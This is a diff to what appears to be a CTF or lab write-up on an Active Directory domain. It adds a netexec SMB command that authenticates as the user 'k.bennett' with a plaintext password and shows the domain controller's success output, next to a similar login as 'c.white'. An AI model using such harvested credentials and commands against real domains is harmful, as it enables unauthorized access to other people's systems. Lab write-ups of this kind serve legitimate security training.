@@ -1037,7 +1037,7 @@ Now ill dump the previously empty  table!
 
 Now i can use these creds and try to authenticate!
 
-# Compromising `c.white` and ``
+# Compromising `c.white` and `k.bennett`
 
 ```python
 nxc smb dc.northstone.local -u c.white -p 'pa$$w0rd72872'                         
@@ -1048,5 +1048,10 @@ SMB         10.1.209.181    445    DC               [+] northstone.local\c.white
 I now have `c.white` credentials!
 
 ```python
-
+nxc smb dc.northstone.local -u k.bennett -p 'B#8tL!2qPz@6YxM'
+SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.209.181    445    DC               [+] northstone.local\k.bennett:B#8tL!2qPz@6YxM
 ```
+
+I also got access as `k.bennett`
+
